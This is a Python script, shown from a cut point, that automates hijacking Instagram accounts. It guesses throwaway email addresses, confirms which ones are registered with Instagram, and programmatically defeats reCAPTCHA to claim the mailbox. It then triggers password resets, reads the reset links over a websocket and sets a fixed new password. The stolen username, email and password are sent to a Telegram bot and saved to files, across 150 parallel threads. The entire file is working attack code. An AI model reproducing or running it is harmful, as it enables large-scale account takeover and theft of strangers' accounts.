    params_text = '{"client_input_params":{"search_query":"' + eml + '","accounts_list":[{"uid":"61242848064","credential_type":"spc_local_auth","token":"BearerIGT:2:eyJkc191c2VyX2lkIjoiNjEyNDI4NDgwNjQiLCJzZXNzaW9uaWQiOiI2MTI0Mjg0ODA2NCUzQXBUNnh2TVhDUWJBQ3RrJTNBMjklM0FBWWprbUZENVNZLUFnQ3NvU3ZFbFZzaUtlOGN1RVVmN2lPcnE0ZDRnbmcifQ=="}],"android_build_type":"release"}}'
    
    data = {
        'params': params_text,
        'bk_client_context': '{"bloks_version":"b86f6fc6f8131e7f0d789ecd251bbf01896d7d103e6345b34d3e806663c0ff8b","styles_id":"instagram"}',
        'bloks_versioning_id': 'b86f6fc6f8131e7f0d789ecd251bbf01896d7d103e6345b34d3e806663c0ff8b',
    }
    try:
        response = session.post(
            'https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/',
            headers=headers,
            data=data,
            stream=True      
        ).text
        print('')
        hidden_email = None
        match = re.search(r'([a-zA-Z0-9]\*+[a-zA-Z0-9]@[a-zA-Z0-9]+\.[a-zA-Z]+)', response)
        if match:
            hidden_email = match.group(1)
        success = False
        if f"We sent a link to {eml}" in response:
            don += 1
        elif 'Please try again.' in response and 'Sorry, something went wrong' in response:
            print('turn on vpn :')
        else:
            print('ops')
        return success, hidden_email, eml  
    except Exception as e:
        print(e)

def getu(eml, hash_val, ex):
    global donr, dead
    ws = websocket.WebSocket()
    ws.connect("wss://ws.checker.in:8443", header=[
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
        "Origin: https://hi2.in"
    ])
    print(ws.recv())
    
    ws.send(f"{ex}-{eml}-{hash_val}")
    ws.send("ping")
    
    i = 0
    reset_link = None
    username = None
    send(eml)
    
    while i <= 5:
        i += 1
        try:
            msg = ws.recv()
            print("Server:", msg[:200] + "..." if len(msg) > 200 else msg)
            
            if msg.startswith('{'):
                try:
                    data = json.loads(msg)
                    if 'body' in data and 'text' in data['body']:
                        email_text = data['body']['text']
                        reset_links = re.findall(r'https://instagram\.com/accounts/password/reset/confirm/[^\s"\'>]+', email_text)
                        if reset_links:
                            reset_link = reset_links[-1]
                            print("\n" + "="*50)
                            print("reset link : ")
                            print(reset_link)
                        
                        username_match = re.search(r'Hi ([a-zA-Z0-9_]+),', email_text)
                        if username_match:
                            username = username_match.group(1)
                            print("\n user:")
                            print(username)
                            print("="*50)
                        
                        if reset_link and username:
                            new_password = "iiaii2002"
                            
                            print("[*] Trying old password reset method...")
                            success_old = reset_password_old(reset_link, new_password)
                            
                            if not success_old:
                                print("[*] Old method failed, trying new method...")
                                success_new = reset_instagram_password_new(reset_link, new_password)
                                success = success_new
                            else:
                                success = success_old
                            
                            donr += 1
                            if success:
                                print(f"[✓] Password changed to: {new_password}")
                            else:
                                print("[!] Password change failed, but still fetching info.")
                            
                            print(f"[+] Fetching account info for: {username}")
                            followers_count, following_count, full_name, is_private, is_verified, posts_count, account_year, additional_info = get_followers_following(username)
                            
                            user_id = additional_info.get('user_id', 'N/A') if additional_info else 'N/A'
                            biography = additional_info.get('biography', 'N/A') if additional_info else 'N/A'
                            is_professional = additional_info.get('is_professional', False) if additional_info else False
                            
                            # تم استبدال رابط إعادة التعيين برابط الحساب هنا
                            account_url = f"https://www.instagram.com/{username}"
                            message = f"""
ACCOUNT FOUND
========================================
Username: {username}
Email: {eml}
Password: {new_password}
Account Link: {account_url}
========================================
"""
                            url = f"https://api.telegram.org/bot{token}/sendMessage"
                            data = {
                                "chat_id": chid,
                                "text": message
                            }
                            response = requests.post(url, data=data)
                            
                            with open('/storage/emulated/0/Hi2hits.txt', "a", encoding="utf-8") as f:
                                f.write(f"{eml} | {username} | {new_password} | {account_url}\n")
                            with open('/storage/emulated/0/Download/etc.txt', 'a', encoding='utf-8') as f:
                                f.write(f"{eml}\n")
                            
                            print("[✓] Saved to Hi2hits.txt")
                            ws.close()
                            return None, None
                            
                except json.JSONDecodeError:
                    pass
                    
        except Exception as e:
            print("❌ Closed:", e)
            break
    
    if i >= 5 and (not reset_link or not username):
        dead += 1
        print(f"\n[!] No reset link or username found after {i} attempts. Deleting email: {eml}")
        
    ws.close()
    return None, None

def generate_android_id():
    return 'android-' + ''.join(random.choices(string.hexdigits.lower(), k=16))

def generate_device_id():
    return str(uuid.uuid4())

def generate_family_device_id():
    return str(uuid.uuid4())

def generate_mid():
    first_char = random.choice(['a', 'b', 'c'])
    rest = ''.join(random.choices(string.ascii_letters + string.digits, k=30))
    return first_char + rest

def generate_user_agent():
    android_sdk = random.choice(['28', '29', '30', '31', '32', '33', '34'])
    android_ver = random.choice(['9', '10', '11', '12', '13', '14'])
    dpi = random.choice(['320', '360', '420', '480', '560', '640'])
    resolution = random.choice(['720x1280', '1080x1920', '1080x2094', '1080x2160', '1440x2560', '1440x3120'])
    manufacturer = random.choice(['samsung', 'Google', 'OnePlus', 'Xiaomi', 'Huawei', 'OPPO', 'vivo'])
    models = {
        'samsung': ['SM-G960U', 'SM-G973U', 'SM-N960U1', 'SM-A515F', 'SM-S908B'],
        'Google': ['Pixel 5', 'Pixel 6', 'Pixel 7', 'Pixel 8'],
        'OnePlus': ['ONEPLUS A5010', 'ONEPLUS A6013', 'CPH2551'],
        'Xiaomi': ['Mi 10', 'Mi 11', '23127PN0CG'],
        'Huawei': ['P30', 'P40', 'ELE-L29'],
        'OPPO': ['CPH2025', 'CPH2211'],
        'vivo': ['V2023', 'V2110']
    }
    model = random.choice(models.get(manufacturer, ['SM-N960U1']))
    codenames = {
        'samsung': ['starqlteue', 'beyond1q', 'crownqlteue', 'a51', 'b0q'],
        'Google': ['redfin', 'oriole', 'panther', 'cheetah', 'husky'],
        'OnePlus': ['dumpling', 'fajita', 'salami'],
        'Xiaomi': ['umi', 'venus', 'mondrian'],
        'Huawei': ['els', 'ana'],
        'OPPO': ['RMX3085'],
        'vivo': ['RMX3085']
    }
    codename = random.choice(codenames.get(manufacturer, ['crownqlteue']))
    chipset = random.choice(['qcom', 'exynos', 'mtk', 'kirin'])
    locale = 'ar_LY'
    build_number = 792127708
    return f'Instagram 398.0.0.45.77 Android ({android_sdk}/{android_ver}; {dpi}dpi; {resolution}; {manufacturer}; {model}; {codename}; {chipset}; {locale}; {build_number})'

gm = 0

def check_email(email): 
    global bi, hit, be, gm
    siteKey = '6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct'
    siteUrl = 'https://hi2.in/'
    userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'
    request_kwargs = {}
    site_html = requests.get(siteUrl, **request_kwargs).text
    try:
        renderUrl = re.findall(r'''"https://[^"]+\.js"''', site_html)[0].strip('"')
    except:
        renderUrl = 'https://www.google.com/recaptcha/api2/recaptcha__en.js'
    js = requests.get(renderUrl, **request_kwargs).text
    match = re.search(r"po\.src\s*=\s*'(https://[^']+)';", js)
    if match:
        v = match.group(1).split('/')[5]
        api = renderUrl.split('.js')[0]
        if 'api2' not in api and 'enterprise' not in api:
            api += '2'
    else:
        v = renderUrl.split('/')[5]
        api = 'https://www.google.com/recaptcha/api2'
    site = requests.get('https://www.google.com', **request_kwargs)
    cookies = site.cookies
    headers = {
        "accept": "/",
        "accept-language": "en-US,en;q=0.9",
        "origin": "https://www.google.com",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": userAgent
    }
    domain = siteUrl.split('/')[2]
    co = base64.b64encode((f'https://{domain}:443').encode()).decode().replace('=', '.')
    anchor_params = {
        'ar': '1',
        'k': siteKey,
        'co': co,
        'hl': 'en',
        'v': v,
        'size': 'invisible',
        'cb': 'abc123'
    }
    headers['referer'] = siteUrl
    anchor = requests.get(f'{api}/anchor', params=anchor_params, headers=headers, cookies=cookies, **request_kwargs).text
    recaptcha_token = anchor.split('recaptcha-token" value="')[1].split('"')[0]
    reload_headers = headers.copy()
    reload_headers.pop('content-type', None)
    reload_data = {
        'v': v,
        'co': co,
        'reason': 'q',
        'size': 'invisible',
        'hl': 'en',
        'k': siteKey,
        'c': recaptcha_token,
        'chr': '',
        'vh': '',
        'bg': ''
    }
    reload = requests.post(f'{api}/reload?k={siteKey}', data=reload_data, headers=reload_headers, cookies=cookies, **request_kwargs).text
    final_token = reload.split('"rresp","')[1].split('"')[0]
    prefix, domin = email.split('@')
    headers2 = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://hi2.in',
        'referer': 'https://hi2.in/',
        'user-agent': userAgent
    }
    data = {
        'domain': domin,
        'prefix': prefix,
        'recaptcha': final_token
    }
    rss = requests.post('https://hi2.in/api/custom', headers=headers2, data=data, **request_kwargs)
    rs = rss.json()
    print(rs)
    if "hash" in rss.text:
        eml = rs.get('email')
        hash_val = rs.get('hash')
        ex = rs.get('expiry')
        getu(eml, hash_val, ex)
        print(f"\n Good Email -: {eml}")
        gm += 1
    else:
        be += 1

print('''
1 - hi2.in
2- telegmail.com
3 - random
''')
cl = int(input('choice :'))

def em(email):
    global bi, hit, be, dead, gi, donr, don, gm
    try:
        with httpx.Client(http2=True, timeout=30) as client:
            res = client.post(
                "https://i.instagram.com/api/v1/users/check_email/",
                data=f"email={email}",
                headers={
                    'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
                    'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
                }
            ).json()
        if res.get('error_type') == 'email_is_taken':
            check_email(email)  
            gi += 1
        else:
            bi += 1
            print(f'''\033[1;32mhits : {donr} |\033[1;36mgood email : {gm} | \033[1;31mbad email : {be} |\033[1;33mbad ig : {bi} | \033[1;32mgood ig : {gi}  | \033[1;35mdead acc : {dead}\033[0m''')
    except Exception as e:
        print(f"Error: {e}")

def qq():
    ema = random.choice(['hi2.in','telegmail.com'])
    letters = "abcdefghijklmnopqrstwvwxyzuxyz"
    cil = "".join(random.choice(letters) for _ in range(6))
    if cl == 1:
        email = cil + '@' + 'hi2.in'
    elif cl == 2:
        email = cil + '@' + 'telegmail.com'
    elif cl == 3:
        email = cil + '@' + ema
    em(email)

def worker():
    while True:
        qq()

from concurrent.futures import ThreadPoolExecutor
threads_count = 150

with ThreadPoolExecutor(max_workers=threads_count) as executor:
    for _ in range(threads_count):
        executor.submit(worker)
